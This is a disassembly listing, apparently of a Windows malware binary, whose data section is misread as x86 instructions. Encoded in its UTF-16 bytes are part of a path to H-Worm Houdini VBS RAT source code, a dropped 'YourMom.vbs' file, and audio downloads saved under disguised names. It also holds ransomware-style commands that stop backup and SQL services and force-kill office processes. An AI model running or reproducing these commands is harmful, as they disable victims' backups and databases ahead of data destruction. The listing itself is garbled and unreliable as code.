  404238:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40423c:	00 61 00             	add    %ah,0x0(%ecx)
  40423f:	6e                   	outsb  %ds:(%esi),(%dx)
  404240:	00 2f                	add    %ch,(%edi)
  404242:	00 68 00             	add    %ch,0x0(%eax)
  404245:	2d 00 77 00 6f       	sub    $0x6f007700,%eax
  40424a:	00 72 00             	add    %dh,0x0(%edx)
  40424d:	6d                   	insl   (%dx),%es:(%edi)
  40424e:	00 5f 00             	add    %bl,0x0(%edi)
  404251:	68 00 6f 00 75       	push   $0x75006f00
  404256:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  40425a:	00 6e 00             	add    %ch,0x0(%esi)
  40425d:	69 00 2f 00 6d 00    	imul   $0x6d002f,(%eax),%eax
  404263:	61                   	popa
  404264:	00 73 00             	add    %dh,0x0(%ebx)
  404267:	74 00                	je     0x404269
  404269:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40426d:	2f                   	das
  40426e:	00 68 00             	add    %ch,0x0(%eax)
  404271:	2d 00 77 00 6f       	sub    $0x6f007700,%eax
  404276:	00 72 00             	add    %dh,0x0(%edx)
  404279:	6d                   	insl   (%dx),%es:(%edi)
  40427a:	00 5f 00             	add    %bl,0x0(%edi)
  40427d:	68 00 6f 00 75       	push   $0x75006f00
  404282:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  404286:	00 6e 00             	add    %ch,0x0(%esi)
  404289:	69 00 5f 00 76 00    	imul   $0x76005f,(%eax),%eax
  40428f:	62 00                	bound  %eax,(%eax)
  404291:	73 00                	jae    0x404293
  404293:	5f                   	pop    %edi
  404294:	00 72 00             	add    %dh,0x0(%edx)
  404297:	61                   	popa
  404298:	00 74 00 5f          	add    %dh,0x5f(%eax,%eax,1)
  40429c:	00 73 00             	add    %dh,0x0(%ebx)
  40429f:	6f                   	outsl  %ds:(%esi),(%dx)
  4042a0:	00 75 00             	add    %dh,0x0(%ebp)
  4042a3:	72 00                	jb     0x4042a5
  4042a5:	63 00                	arpl   %eax,(%eax)
  4042a7:	65 00 5f 00          	add    %bl,%gs:0x0(%edi)
  4042ab:	63 00                	arpl   %eax,(%eax)
  4042ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ae:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4042b2:	00 01                	add    %al,(%ecx)
  4042b4:	19 5c 00 59          	sbb    %ebx,0x59(%eax,%eax,1)
  4042b8:	00 6f 00             	add    %ch,0x0(%edi)
  4042bb:	75 00                	jne    0x4042bd
  4042bd:	72 00                	jb     0x4042bf
  4042bf:	4d                   	dec    %ebp
  4042c0:	00 6f 00             	add    %ch,0x0(%edi)
  4042c3:	6d                   	insl   (%dx),%es:(%edi)
  4042c4:	00 2e                	add    %ch,(%esi)
  4042c6:	00 76 00             	add    %dh,0x0(%esi)
  4042c9:	62 00                	bound  %eax,(%eax)
  4042cb:	73 00                	jae    0x4042cd
  4042cd:	00 80 95 68 00 74    	add    %al,0x74006895(%eax)
  4042d3:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  4042d7:	00 73 00             	add    %dh,0x0(%ebx)
  4042da:	3a 00                	cmp    (%eax),%al
  4042dc:	2f                   	das
  4042dd:	00 2f                	add    %ch,(%edi)
  4042df:	00 61 00             	add    %ah,0x0(%ecx)
  4042e2:	72 00                	jb     0x4042e4
  4042e4:	63 00                	arpl   %eax,(%eax)
  4042e6:	68 00 69 00 76       	push   $0x76006900
  4042eb:	00 65 00             	add    %ah,0x0(%ebp)
  4042ee:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  4042f2:	72 00                	jb     0x4042f4
  4042f4:	67 00 2f             	add    %ch,(%bx)
  4042f7:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  4042fb:	00 77 00             	add    %dh,0x0(%edi)
  4042fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4042ff:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  404303:	00 61 00             	add    %ah,0x0(%ecx)
  404306:	64 00 2f             	add    %ch,%fs:(%edi)
  404309:	00 53 00             	add    %dl,0x0(%ebx)
  40430c:	6f                   	outsl  %ds:(%esi),(%dx)
  40430d:	00 6e 00             	add    %ch,0x0(%esi)
  404310:	69 00 63 00 54 00    	imul   $0x540063,(%eax),%eax
  404316:	68 00 65 00 48       	push   $0x48006500
  40431b:	00 65 00             	add    %ah,0x0(%ebp)
  40431e:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  404322:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  404326:	6f                   	outsl  %ds:(%esi),(%dx)
  404327:	00 67 00             	add    %ah,0x0(%edi)
  40432a:	32 00                	xor    (%eax),%al
  40432c:	2f                   	das
  40432d:	00 30                	add    %dh,(%eax)
  40432f:	00 39                	add    %bh,(%ecx)
  404331:	00 2e                	add    %ch,(%esi)
  404333:	00 25 00 32 00 30    	add    %ah,0x30003200
  404339:	00 4d 00             	add    %cl,0x0(%ebp)
  40433c:	65 00 74 00 72       	add    %dh,%gs:0x72(%eax,%eax,1)
  404341:	00 6f 00             	add    %ch,0x0(%edi)
  404344:	70 00                	jo     0x404346
  404346:	6f                   	outsl  %ds:(%esi),(%dx)
  404347:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40434b:	00 73 00             	add    %dh,0x0(%ebx)
  40434e:	25 00 32 00 30       	and    $0x30003200,%eax
  404353:	00 5a 00             	add    %bl,0x0(%edx)
  404356:	6f                   	outsl  %ds:(%esi),(%dx)
  404357:	00 6e 00             	add    %ch,0x0(%esi)
  40435a:	65 00 2e             	add    %ch,%gs:(%esi)
  40435d:	00 6d 00             	add    %ch,0x0(%ebp)
  404360:	70 00                	jo     0x404362
  404362:	33 00                	xor    (%eax),%eax
  404364:	00 19                	add    %bl,(%ecx)
  404366:	5c                   	pop    %esp
  404367:	00 4d 00             	add    %cl,0x0(%ebp)
  40436a:	53                   	push   %ebx
  40436b:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40436f:	00 53 00             	add    %dl,0x0(%ebx)
  404372:	33 00                	xor    (%eax),%eax
  404374:	32 00                	xor    (%eax),%al
  404376:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  40437a:	70 00                	jo     0x40437c
  40437c:	33 00                	xor    (%eax),%eax
  40437e:	00 80 fb 68 00 74    	add    %al,0x740068fb(%eax)
  404384:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  404388:	00 73 00             	add    %dh,0x0(%ebx)
  40438b:	3a 00                	cmp    (%eax),%al
  40438d:	2f                   	das
  40438e:	00 2f                	add    %ch,(%edi)
  404390:	00 76 00             	add    %dh,0x0(%esi)
  404393:	67 00 6d 00          	add    %ch,0x0(%di)
  404397:	73 00                	jae    0x404399
  404399:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  40439f:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4043a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a4:	00 6d 00             	add    %ch,0x0(%ebp)
  4043a7:	2f                   	das
  4043a8:	00 73 00             	add    %dh,0x0(%ebx)
  4043ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ac:	00 75 00             	add    %dh,0x0(%ebp)
  4043af:	6e                   	outsb  %ds:(%esi),(%dx)
  4043b0:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  4043b4:	00 72 00             	add    %dh,0x0(%edx)
  4043b7:	61                   	popa
  4043b8:	00 63 00             	add    %ah,0x0(%ebx)
  4043bb:	6b 00 73             	imul   $0x73,(%eax),%eax
  4043be:	00 2f                	add    %ch,(%edi)
  4043c0:	00 66 00             	add    %ah,0x0(%esi)
  4043c3:	69 00 76 00 65 00    	imul   $0x650076,(%eax),%eax
  4043c9:	2d 00 6e 00 69       	sub    $0x69006e00,%eax
  4043ce:	00 67 00             	add    %ah,0x0(%edi)
  4043d1:	68 00 74 00 73       	push   $0x73007400
  4043d6:	00 2d 00 61 00 74    	add    %ch,0x74006100
  4043dc:	00 2d 00 66 00 72    	add    %ch,0x72006600
  4043e2:	00 65 00             	add    %ah,0x0(%ebp)
  4043e5:	64 00 64 00 79       	add    %ah,%fs:0x79(%eax,%eax,1)
  4043ea:	00 2d 00 73 00 2d    	add    %ch,0x2d007300
  4043f0:	00 77 00             	add    %dh,0x0(%edi)
  4043f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043f4:	00 72 00             	add    %dh,0x0(%edx)
  4043f7:	6c                   	insb   (%dx),%es:(%edi)
  4043f8:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  4043fc:	00 66 00             	add    %ah,0x0(%esi)
  4043ff:	6e                   	outsb  %ds:(%esi),(%dx)
  404400:	00 61 00             	add    %ah,0x0(%ecx)
  404403:	66 00 2d 00 77 00 6f 	data16 add %ch,0x6f007700
  40440a:	00 72 00             	add    %dh,0x0(%edx)
  40440d:	6c                   	insb   (%dx),%es:(%edi)
  40440e:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  404412:	00 73 00             	add    %dh,0x0(%ebx)
  404415:	6f                   	outsl  %ds:(%esi),(%dx)
  404416:	00 75 00             	add    %dh,0x0(%ebp)
  404419:	6e                   	outsb  %ds:(%esi),(%dx)
  40441a:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40441e:	00 72 00             	add    %dh,0x0(%edx)
  404421:	61                   	popa
  404422:	00 63 00             	add    %ah,0x0(%ebx)
  404425:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  404428:	00 71 00             	add    %dh,0x0(%ecx)
  40442b:	6d                   	insl   (%dx),%es:(%edi)
  40442c:	00 6b 00             	add    %ch,0x0(%ebx)
  40442f:	6f                   	outsl  %ds:(%esi),(%dx)
  404430:	00 61 00             	add    %ah,0x0(%ecx)
  404433:	61                   	popa
  404434:	00 79 00             	add    %bh,0x0(%ecx)
  404437:	69 00 2f 00 32 00    	imul   $0x32002f,(%eax),%eax
  40443d:	32 00                	xor    (%eax),%al
  40443f:	25 00 32 00 30       	and    $0x30003200,%eax
  404444:	00 46 00             	add    %al,0x0(%esi)
  404447:	6f                   	outsl  %ds:(%esi),(%dx)
  404448:	00 78 00             	add    %bh,0x0(%eax)
  40444b:	79 00                	jns    0x40444d
  40444d:	25 00 32 00 30       	and    $0x30003200,%eax
  404452:	00 46 00             	add    %al,0x0(%esi)
  404455:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40445b:	74 00                	je     0x40445d
  40445d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404461:	73 00                	jae    0x404463
  404463:	25 00 32 00 30       	and    $0x30003200,%eax
  404468:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40446c:	00 65 00             	add    %ah,0x0(%ebp)
  40446f:	6d                   	insl   (%dx),%es:(%edi)
  404470:	00 65 00             	add    %ah,0x0(%ebp)
  404473:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  404477:	70 00                	jo     0x404479
  404479:	33 00                	xor    (%eax),%eax
  40447b:	01 1b                	add    %ebx,(%ebx)
  40447d:	5c                   	pop    %esp
  40447e:	00 4d 00             	add    %cl,0x0(%ebp)
  404481:	53                   	push   %ebx
  404482:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  404486:	00 53 00             	add    %dl,0x0(%ebx)
  404489:	33 00                	xor    (%eax),%eax
  40448b:	32 00                	xor    (%eax),%al
  40448d:	33 00                	xor    (%eax),%eax
  40448f:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  404493:	70 00                	jo     0x404495
  404495:	33 00                	xor    (%eax),%eax
  404497:	00 39                	add    %bh,(%ecx)
  404499:	6e                   	outsb  %ds:(%esi),(%dx)
  40449a:	00 65 00             	add    %ah,0x0(%ebp)
  40449d:	74 00                	je     0x40449f
  40449f:	20 00                	and    %al,(%eax)
  4044a1:	73 00                	jae    0x4044a3
  4044a3:	74 00                	je     0x4044a5
  4044a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4044a6:	00 70 00             	add    %dh,0x0(%eax)
  4044a9:	20 00                	and    %al,(%eax)
  4044ab:	42                   	inc    %edx
  4044ac:	00 4d 00             	add    %cl,0x0(%ebp)
  4044af:	52                   	push   %edx
  4044b0:	00 20                	add    %ah,(%eax)
  4044b2:	00 42 00             	add    %al,0x0(%edx)
  4044b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4044b6:	00 6f 00             	add    %ch,0x0(%edi)
  4044b9:	74 00                	je     0x4044bb
  4044bb:	20 00                	and    %al,(%eax)
  4044bd:	53                   	push   %ebx
  4044be:	00 65 00             	add    %ah,0x0(%ebp)
  4044c1:	72 00                	jb     0x4044c3
  4044c3:	76 00                	jbe    0x4044c5
  4044c5:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  4044cb:	20 00                	and    %al,(%eax)
  4044cd:	2f                   	das
  4044ce:	00 79 00             	add    %bh,0x0(%ecx)
  4044d1:	00 4f 6e             	add    %cl,0x6e(%edi)
  4044d4:	00 65 00             	add    %ah,0x0(%ebp)
  4044d7:	74 00                	je     0x4044d9
  4044d9:	20 00                	and    %al,(%eax)
  4044db:	73 00                	jae    0x4044dd
  4044dd:	74 00                	je     0x4044df
  4044df:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e0:	00 70 00             	add    %dh,0x0(%eax)
  4044e3:	20 00                	and    %al,(%eax)
  4044e5:	4e                   	dec    %esi
  4044e6:	00 65 00             	add    %ah,0x0(%ebp)
  4044e9:	74 00                	je     0x4044eb
  4044eb:	42                   	inc    %edx
  4044ec:	00 61 00             	add    %ah,0x0(%ecx)
  4044ef:	63 00                	arpl   %eax,(%eax)
  4044f1:	6b 00 75             	imul   $0x75,(%eax),%eax
  4044f4:	00 70 00             	add    %dh,0x0(%eax)
  4044f7:	20 00                	and    %al,(%eax)
  4044f9:	42                   	inc    %edx
  4044fa:	00 4d 00             	add    %cl,0x0(%ebp)
  4044fd:	52                   	push   %edx
  4044fe:	00 20                	add    %ah,(%eax)
  404500:	00 4d 00             	add    %cl,0x0(%ebp)
  404503:	54                   	push   %esp
  404504:	00 46 00             	add    %al,0x0(%esi)
  404507:	54                   	push   %esp
  404508:	00 50 00             	add    %dl,0x0(%eax)
  40450b:	20 00                	and    %al,(%eax)
  40450d:	53                   	push   %ebx
  40450e:	00 65 00             	add    %ah,0x0(%ebp)
  404511:	72 00                	jb     0x404513
  404513:	76 00                	jbe    0x404515
  404515:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40451b:	20 00                	and    %al,(%eax)
  40451d:	2f                   	das
  40451e:	00 79 00             	add    %bh,0x0(%ecx)
  404521:	00 4d 73             	add    %cl,0x73(%ebp)
  404524:	00 63 00             	add    %ah,0x0(%ebx)
  404527:	20 00                	and    %al,(%eax)
  404529:	63 00                	arpl   %eax,(%eax)
  40452b:	6f                   	outsl  %ds:(%esi),(%dx)
  40452c:	00 6e 00             	add    %ch,0x0(%esi)
  40452f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  404533:	67 00 20             	add    %ah,(%bx,%si)
  404536:	00 53 00             	add    %dl,0x0(%ebx)
  404539:	51                   	push   %ecx
  40453a:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40453e:	00 45 00             	add    %al,0x0(%ebp)
  404541:	4c                   	dec    %esp
  404542:	00 45 00             	add    %al,0x0(%ebp)
  404545:	4d                   	dec    %ebp
  404546:	00 45 00             	add    %al,0x0(%ebp)
  404549:	54                   	push   %esp
  40454a:	00 52 00             	add    %dl,0x0(%edx)
  40454d:	59                   	pop    %ecx
  40454e:	00 20                	add    %ah,(%eax)
  404550:	00 73 00             	add    %dh,0x0(%ebx)
  404553:	74 00                	je     0x404555
  404555:	61                   	popa
  404556:	00 72 00             	add    %dh,0x0(%edx)
  404559:	74 00                	je     0x40455b
  40455b:	3d 00 20 00 64       	cmp    $0x64002000,%eax
  404560:	00 69 00             	add    %ch,0x0(%ecx)
  404563:	73 00                	jae    0x404565
  404565:	61                   	popa
  404566:	00 62 00             	add    %ah,0x0(%edx)
  404569:	6c                   	insb   (%dx),%es:(%edi)
  40456a:	00 65 00             	add    %ah,0x0(%ebp)
  40456d:	64 00 00             	add    %al,%fs:(%eax)
  404570:	5b                   	pop    %ebx
  404571:	73 00                	jae    0x404573
  404573:	63 00                	arpl   %eax,(%eax)
  404575:	20 00                	and    %al,(%eax)
  404577:	63 00                	arpl   %eax,(%eax)
  404579:	6f                   	outsl  %ds:(%esi),(%dx)
  40457a:	00 6e 00             	add    %ch,0x0(%esi)
  40457d:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  404581:	67 00 20             	add    %ah,(%bx,%si)
  404584:	00 53 00             	add    %dl,0x0(%ebx)
  404587:	51                   	push   %ecx
  404588:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40458c:	00 45 00             	add    %al,0x0(%ebp)
  40458f:	4c                   	dec    %esp
  404590:	00 45 00             	add    %al,0x0(%ebp)
  404593:	4d                   	dec    %ebp
  404594:	00 45 00             	add    %al,0x0(%ebp)
  404597:	54                   	push   %esp
  404598:	00 52 00             	add    %dl,0x0(%edx)
  40459b:	59                   	pop    %ecx
  40459c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40459f:	45                   	inc    %ebp
  4045a0:	00 43 00             	add    %al,0x0(%ebx)
  4045a3:	57                   	push   %edi
  4045a4:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  4045a8:	00 32                	add    %dh,(%edx)
  4045aa:	00 20                	add    %ah,(%eax)
  4045ac:	00 73 00             	add    %dh,0x0(%ebx)
  4045af:	74 00                	je     0x4045b1
  4045b1:	61                   	popa
  4045b2:	00 72 00             	add    %dh,0x0(%edx)
  4045b5:	74 00                	je     0x4045b7
  4045b7:	3d 00 20 00 64       	cmp    $0x64002000,%eax
  4045bc:	00 69 00             	add    %ch,0x0(%ecx)
  4045bf:	73 00                	jae    0x4045c1
  4045c1:	61                   	popa
  4045c2:	00 62 00             	add    %ah,0x0(%edx)
  4045c5:	6c                   	insb   (%dx),%es:(%edi)
  4045c6:	00 65 00             	add    %ah,0x0(%ebp)
  4045c9:	64 00 00             	add    %al,%fs:(%eax)
  4045cc:	25 6e 00 65 00       	and    $0x65006e,%eax
  4045d1:	74 00                	je     0x4045d3
  4045d3:	20 00                	and    %al,(%eax)
  4045d5:	73 00                	jae    0x4045d7
  4045d7:	74 00                	je     0x4045d9
  4045d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045da:	00 70 00             	add    %dh,0x0(%eax)
  4045dd:	20 00                	and    %al,(%eax)
  4045df:	74 00                	je     0x4045e1
  4045e1:	68 00 65 00 6d       	push   $0x6d006500
  4045e6:	00 65 00             	add    %ah,0x0(%ebp)
  4045e9:	73 00                	jae    0x4045eb
  4045eb:	20 00                	and    %al,(%eax)
  4045ed:	2f                   	das
  4045ee:	00 79 00             	add    %bh,0x0(%ecx)
  4045f1:	00 53 20             	add    %dl,0x20(%ebx)
  4045f4:	00 20                	add    %ah,(%eax)
  4045f6:	00 20                	add    %ah,(%eax)
  4045f8:	00 20                	add    %ah,(%eax)
  4045fa:	00 20                	add    %ah,(%eax)
  4045fc:	00 20                	add    %ah,(%eax)
  4045fe:	00 73 00             	add    %dh,0x0(%ebx)
  404601:	63 00                	arpl   %eax,(%eax)
  404603:	20 00                	and    %al,(%eax)
  404605:	63 00                	arpl   %eax,(%eax)
  404607:	6f                   	outsl  %ds:(%esi),(%dx)
  404608:	00 6e 00             	add    %ch,0x0(%esi)
  40460b:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40460f:	67 00 20             	add    %ah,(%bx,%si)
  404612:	00 53 00             	add    %dl,0x0(%ebx)
  404615:	51                   	push   %ecx
  404616:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40461a:	00 72 00             	add    %dh,0x0(%edx)
  40461d:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  404623:	72 00                	jb     0x404625
  404625:	20 00                	and    %al,(%eax)
  404627:	73 00                	jae    0x404629
  404629:	74 00                	je     0x40462b
  40462b:	61                   	popa
  40462c:	00 72 00             	add    %dh,0x0(%edx)
  40462f:	74 00                	je     0x404631
  404631:	3d 00 20 00 64       	cmp    $0x64002000,%eax
  404636:	00 69 00             	add    %ch,0x0(%ecx)
  404639:	73 00                	jae    0x40463b
  40463b:	61                   	popa
  40463c:	00 62 00             	add    %ah,0x0(%edx)
  40463f:	6c                   	insb   (%dx),%es:(%edi)
  404640:	00 65 00             	add    %ah,0x0(%ebp)
  404643:	64 00 00             	add    %al,%fs:(%eax)
  404646:	79 20                	jns    0x404668
  404648:	00 20                	add    %ah,(%eax)
  40464a:	00 20                	add    %ah,(%eax)
  40464c:	00 20                	add    %ah,(%eax)
  40464e:	00 20                	add    %ah,(%eax)
  404650:	00 20                	add    %ah,(%eax)
  404652:	00 20                	add    %ah,(%eax)
  404654:	00 20                	add    %ah,(%eax)
  404656:	00 20                	add    %ah,(%eax)
  404658:	00 20                	add    %ah,(%eax)
  40465a:	00 20                	add    %ah,(%eax)
  40465c:	00 20                	add    %ah,(%eax)
  40465e:	00 20                	add    %ah,(%eax)
  404660:	00 20                	add    %ah,(%eax)
  404662:	00 20                	add    %ah,(%eax)
  404664:	00 20                	add    %ah,(%eax)
  404666:	00 20                	add    %ah,(%eax)
  404668:	00 20                	add    %ah,(%eax)
  40466a:	00 20                	add    %ah,(%eax)
  40466c:	00 20                	add    %ah,(%eax)
  40466e:	00 20                	add    %ah,(%eax)
  404670:	00 20                	add    %ah,(%eax)
  404672:	00 20                	add    %ah,(%eax)
  404674:	00 20                	add    %ah,(%eax)
  404676:	00 20                	add    %ah,(%eax)
  404678:	00 20                	add    %ah,(%eax)
  40467a:	00 20                	add    %ah,(%eax)
  40467c:	00 73 00             	add    %dh,0x0(%ebx)
  40467f:	63 00                	arpl   %eax,(%eax)
  404681:	20 00                	and    %al,(%eax)
  404683:	63 00                	arpl   %eax,(%eax)
  404685:	6f                   	outsl  %ds:(%esi),(%dx)
  404686:	00 6e 00             	add    %ch,0x0(%esi)
  404689:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40468d:	67 00 20             	add    %ah,(%bx,%si)
  404690:	00 53 00             	add    %dl,0x0(%ebx)
  404693:	73 00                	jae    0x404695
  404695:	74 00                	je     0x404697
  404697:	70 00                	jo     0x404699
  404699:	53                   	push   %ebx
  40469a:	00 76 00             	add    %dh,0x0(%esi)
  40469d:	63 00                	arpl   %eax,(%eax)
  40469f:	20 00                	and    %al,(%eax)
  4046a1:	73 00                	jae    0x4046a3
  4046a3:	74 00                	je     0x4046a5
  4046a5:	61                   	popa
  4046a6:	00 72 00             	add    %dh,0x0(%edx)
  4046a9:	74 00                	je     0x4046ab
  4046ab:	3d 00 20 00 64       	cmp    $0x64002000,%eax
  4046b0:	00 69 00             	add    %ch,0x0(%ecx)
  4046b3:	73 00                	jae    0x4046b5
  4046b5:	61                   	popa
  4046b6:	00 62 00             	add    %ah,0x0(%edx)
  4046b9:	6c                   	insb   (%dx),%es:(%edi)
  4046ba:	00 65 00             	add    %ah,0x0(%ebp)
  4046bd:	64 00 00             	add    %al,%fs:(%eax)
  4046c0:	69 20 00 20 00 20    	imul   $0x20002000,(%eax),%esp
  4046c6:	00 20                	add    %ah,(%eax)
  4046c8:	00 20                	add    %ah,(%eax)
  4046ca:	00 20                	add    %ah,(%eax)
  4046cc:	00 20                	add    %ah,(%eax)
  4046ce:	00 20                	add    %ah,(%eax)
  4046d0:	00 20                	add    %ah,(%eax)
  4046d2:	00 20                	add    %ah,(%eax)
  4046d4:	00 20                	add    %ah,(%eax)
  4046d6:	00 20                	add    %ah,(%eax)
  4046d8:	00 20                	add    %ah,(%eax)
  4046da:	00 20                	add    %ah,(%eax)
  4046dc:	00 20                	add    %ah,(%eax)
  4046de:	00 20                	add    %ah,(%eax)
  4046e0:	00 20                	add    %ah,(%eax)
  4046e2:	00 20                	add    %ah,(%eax)
  4046e4:	00 20                	add    %ah,(%eax)
  4046e6:	00 20                	add    %ah,(%eax)
  4046e8:	00 20                	add    %ah,(%eax)
  4046ea:	00 20                	add    %ah,(%eax)
  4046ec:	00 20                	add    %ah,(%eax)
  4046ee:	00 20                	add    %ah,(%eax)
  4046f0:	00 20                	add    %ah,(%eax)
  4046f2:	00 20                	add    %ah,(%eax)
  4046f4:	00 20                	add    %ah,(%eax)
  4046f6:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4046fa:	00 73 00             	add    %dh,0x0(%ebx)
  4046fd:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  404700:	00 69 00             	add    %ch,0x0(%ecx)
  404703:	6c                   	insb   (%dx),%es:(%edi)
  404704:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404708:	00 2f                	add    %ch,(%edi)
  40470a:	00 49 00             	add    %cl,0x0(%ecx)
  40470d:	4d                   	dec    %ebp
  40470e:	00 20                	add    %ah,(%eax)
  404710:	00 6d 00             	add    %ch,0x0(%ebp)
  404713:	73 00                	jae    0x404715
  404715:	70 00                	jo     0x404717
  404717:	75 00                	jne    0x404719
  404719:	62 00                	bound  %eax,(%eax)
  40471b:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40471f:	78 00                	js     0x404721
  404721:	65 00 20             	add    %ah,%gs:(%eax)
  404724:	00 2f                	add    %ch,(%edi)
  404726:	00 46 00             	add    %al,0x0(%esi)
  404729:	00 77 20             	add    %dh,0x20(%edi)
  40472c:	00 20                	add    %ah,(%eax)
  40472e:	00 20                	add    %ah,(%eax)
  404730:	00 20                	add    %ah,(%eax)
  404732:	00 20                	add    %ah,(%eax)
  404734:	00 20                	add    %ah,(%eax)
  404736:	00 20                	add    %ah,(%eax)
  404738:	00 20                	add    %ah,(%eax)
  40473a:	00 20                	add    %ah,(%eax)
  40473c:	00 20                	add    %ah,(%eax)
  40473e:	00 20                	add    %ah,(%eax)
  404740:	00 20                	add    %ah,(%eax)
  404742:	00 20                	add    %ah,(%eax)
  404744:	00 20                	add    %ah,(%eax)
  404746:	00 20                	add    %ah,(%eax)
  404748:	00 20                	add    %ah,(%eax)
  40474a:	00 20                	add    %ah,(%eax)
  40474c:	00 20                	add    %ah,(%eax)
  40474e:	00 20                	add    %ah,(%eax)
  404750:	00 20                	add    %ah,(%eax)
  404752:	00 20                	add    %ah,(%eax)
  404754:	00 20                	add    %ah,(%eax)
  404756:	00 20                	add    %ah,(%eax)
  404758:	00 20                	add    %ah,(%eax)
  40475a:	00 20                	add    %ah,(%eax)
  40475c:	00 20                	add    %ah,(%eax)
  40475e:	00 20                	add    %ah,(%eax)
  404760:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  404764:	00 73 00             	add    %dh,0x0(%ebx)
  404767:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40476a:	00 69 00             	add    %ch,0x0(%ecx)
  40476d:	6c                   	insb   (%dx),%es:(%edi)
  40476e:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404772:	00 2f                	add    %ch,(%edi)
  404774:	00 49 00             	add    %cl,0x0(%ecx)
  404777:	4d                   	dec    %ebp
  404778:	00 20                	add    %ah,(%eax)
  40477a:	00 6d 00             	add    %ch,0x0(%ebp)
  40477d:	79 00                	jns    0x40477f
  40477f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  404783:	73 00                	jae    0x404785
  404785:	6b 00 74             	imul   $0x74,(%eax),%eax
  404788:	00 6f 00             	add    %ch,0x0(%edi)
  40478b:	70 00                	jo     0x40478d
  40478d:	71 00                	jno    0x40478f
  40478f:	6f                   	outsl  %ds:(%esi),(%dx)
  404790:	00 73 00             	add    %dh,0x0(%ebx)
  404793:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  404797:	78 00                	js     0x404799
  404799:	65 00 20             	add    %ah,%gs:(%eax)
  40479c:	00 2f                	add    %ch,(%edi)
  40479e:	00 46 00             	add    %al,0x0(%esi)
  4047a1:	00 7f 20             	add    %bh,0x20(%edi)
  4047a4:	00 20                	add    %ah,(%eax)
  4047a6:	00 20                	add    %ah,(%eax)
  4047a8:	00 20                	add    %ah,(%eax)
  4047aa:	00 20                	add    %ah,(%eax)
  4047ac:	00 20                	add    %ah,(%eax)
  4047ae:	00 20                	add    %ah,(%eax)
  4047b0:	00 20                	add    %ah,(%eax)
  4047b2:	00 20                	add    %ah,(%eax)
  4047b4:	00 20                	add    %ah,(%eax)
  4047b6:	00 20                	add    %ah,(%eax)
  4047b8:	00 20                	add    %ah,(%eax)
  4047ba:	00 20                	add    %ah,(%eax)
  4047bc:	00 20                	add    %ah,(%eax)
  4047be:	00 20                	add    %ah,(%eax)
  4047c0:	00 20                	add    %ah,(%eax)
  4047c2:	00 20                	add    %ah,(%eax)
  4047c4:	00 20                	add    %ah,(%eax)
  4047c6:	00 20                	add    %ah,(%eax)
  4047c8:	00 20                	add    %ah,(%eax)
  4047ca:	00 20                	add    %ah,(%eax)
  4047cc:	00 20                	add    %ah,(%eax)
  4047ce:	00 20                	add    %ah,(%eax)
  4047d0:	00 20                	add    %ah,(%eax)
  4047d2:	00 20                	add    %ah,(%eax)
  4047d4:	00 20                	add    %ah,(%eax)
  4047d6:	00 20                	add    %ah,(%eax)
  4047d8:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4047dc:	00 73 00             	add    %dh,0x0(%ebx)
  4047df:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  4047e2:	00 69 00             	add    %ch,0x0(%ecx)
  4047e5:	6c                   	insb   (%dx),%es:(%edi)
